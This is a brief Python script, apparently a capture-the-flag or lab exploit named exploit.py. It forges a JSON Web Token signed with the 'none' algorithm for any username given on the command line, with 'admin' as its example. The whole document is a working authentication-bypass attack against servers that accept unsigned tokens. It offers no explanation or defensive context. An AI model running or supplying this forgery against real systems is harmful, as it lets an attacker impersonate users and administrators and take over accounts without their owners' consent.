import jwt
import sys
if (len(sys.argv)) != 2:
	print("./exploit.py <user> ")
	print("exmaple : ./exploit.py admin")
	exit(0)

user = sys.argv[1]
encoded = jwt.encode({'username': user}, '', algorithm='none')
print (encoded.decode())
